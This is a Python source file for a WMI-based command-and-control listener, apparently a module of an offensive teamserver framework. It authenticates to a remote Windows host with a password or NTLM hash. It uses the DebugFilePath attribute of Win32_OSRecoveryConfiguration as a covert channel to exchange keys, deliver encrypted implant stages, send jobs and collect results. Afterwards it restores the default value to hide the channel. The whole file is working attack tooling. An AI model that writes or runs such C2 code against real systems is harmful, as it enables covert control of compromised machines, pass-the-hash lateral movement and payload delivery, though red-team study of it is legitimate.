import logging
import sys
import traceback
from time import sleep
from base64 import b64decode, b64encode
from urza.core.events import Events
from urza.core.teamserver.listener import Listener
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

class STListener(Listener):
    def __init__(self):
        super().__init__()
        self.name = 'wmi'
        self.author = '@byt3bl33d3r'
        self.description = 'C2 over pure WMI'

        # We'll watch this for an exit condition
        self.keep_running = True

        self.options = {
            'Name': {
                'Description': 'Name for the listener.',
                'Required': True,
                'Value': 'wmi'
            },
            'Host': {
                'Description': 'Remote host to poll',
                'Required': True,
                'Value': ''
            },
            'Domain': {
                'Description': 'Domain',
                'Required': True,
                'Value': ''
            },
            'Username': {
                'Description': 'Username',
                'Required': True,
                'Value': ''
            },
            'Password': {
                'Description': 'Password',
                'Required': False,
                'Value': ''
            },
            'Hash': {
                'Description': 'NTLM Hash',
                'Required': False,
                'Value': ''
            },
            'CheckInterval': {
                'Description': 'Interval in seconds to check for agent output',
                'Required': True,
                'Value': 10
            },
            'WMIClass': {
                'Description': 'WMI class to use for C2',
                'Required': True,
                'Value': 'Win32_OSRecoveryConfiguration'
            },
            'WMIAttribute': {
                'Description': 'WMI class attribute to use for C2',
                'Required': True,
                'Value': 'DebugFilePath'
            },
            'Comms': {
                'Description': 'C2 Comms to use',
                'Required': True,
                'Value': 'wmi'
            }
        }

    def run(self):
        """
        Main polling loop that ends when self.keep_running is set to False by .stop().
        """
        logging.debug("Creating DCOM connection for WMI listener ...")
        try:
            lmhash = ''
            nthash = ''
            if self["Hash"]:
                if ":" in self["Hash"]:
                    lmhash, nthash = self["Hash"].split(":")
                else:
                    nthash = self["Hash"]

            dcom = DCOMConnection(
                self["Host"],
                self["Username"],
                self["Password"],
                self["Domain"],
                lmhash,
                nthash,
                oxidResolver=False
            )

            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            logging.debug("WMI listener loop started.")
            while self.keep_running:
                try:
                    records = self._read(iWbemServices)
                    debug_value = self._extract_debug_file_path(records)
                    if debug_value != "%SystemRoot%\\MEMORY.DMP":
                        GUID, op, creator, data = debug_value.split(":")
                        if creator == "client":
                            self._handle_client_op(GUID, op, data, records, iWbemServices)
                except Exception as e:
                    logging.error(f"WMI listener encountered an error: {e}")
                    traceback.print_exc()

                sleep(int(self["CheckInterval"]))

            logging.debug("WMI listener loop ended normally.")

        except Exception as e:
            logging.error(f"Error in WMI run method: {e}")
            traceback.print_exc()

    def stop(self):
        """
        Stop the WMI infinite loop by setting self.keep_running to False.
        """
        logging.debug("Stopping WMI listener, setting keep_running=False.")
        self.keep_running = False

    def _read(self, iWbemServices, query="Select * From Win32_OSRecoveryConfiguration"):
        records = []
        iEnum = iWbemServices.ExecQuery(query)
        while True:
            try:
                pEnum = iEnum.Next(0xffffffff, 1)[0]
                records.append(pEnum.getProperties())
            except Exception as e:
                # If we get S_FALSE, that means no more records
                if "S_FALSE" not in str(e):
                    raise e
                break
        iEnum.RemRelease()
        return records

    def _extract_debug_file_path(self, records):
        for r in records:
            if "DebugFilePath" in r:
                return r["DebugFilePath"]["value"]
        return "%SystemRoot%\\MEMORY.DMP"

    def _write_payload(self, iWbemServices, records, payload, attribute="DebugFilePath",
                       wmi_class="Win32_OSRecoveryConfiguration"):
        def autoconvert(v):
            type_dict = {"string": str, "uint32": int, "bool": bool}
            return type_dict[v['stype']](v['value'])

        activeScript, _ = iWbemServices.GetObject(wmi_class)
        activeScript = activeScript.SpawnInstance()
        for record in records:
            for k, v in record.items():
                setattr(activeScript, k, autoconvert(v))
        if payload:
            setattr(activeScript, attribute, payload)
        resp = iWbemServices.PutInstance(activeScript.marshalMe())
        if resp.GetCallStatus(0) != 0:
            raise Exception(f"Error writing payload to {wmi_class}.{attribute} - status=0x{resp.GetCallStatus(0):X}")

    def _handle_client_op(self, GUID, op, data, records, iWbemServices):
        if op == "kex":
            pub_key = self.dispatch_event(Events.KEX, (GUID, self["Host"], b64decode(data)))
            if pub_key:
                self._write_payload(
                    iWbemServices,
                    records,
                    payload=f"{GUID}:kex:server:{b64encode(pub_key.encode()).decode()}"
                )
        elif op == "stage":
            stage_file = self.dispatch_event(Events.ENCRYPT_STAGE, (GUID, self["Host"], self["Comms"]))
            if stage_file:
                self.dispatch_event(Events.SESSION_STAGED,
                    f"Sending stage ({sys.getsizeof(stage_file)} bytes) -> {self['Host']} ..."
                )
                self._write_payload(
                    iWbemServices,
                    records,
                    payload=f"{GUID}:stage:server:{b64encode(stage_file).decode()}"
                )
        elif op == "jobs":
            job = self.dispatch_event(Events.SESSION_CHECKIN, (GUID, self["Host"]))
            if job:
                self._write_payload(
                    iWbemServices,
                    records,
                    payload=f"{GUID}:jobs:server:{b64encode(job).decode()}"
                )
        elif op.startswith("job_results"):
            _, job_id = op.split("|", 1)
            self.dispatch_event(Events.JOB_RESULT, (GUID, self["Host"], job_id, b64decode(data)))
            # After reading job results, revert to default
            self._write_payload(iWbemServices, records, "%SystemRoot%\\MEMORY.DMP")
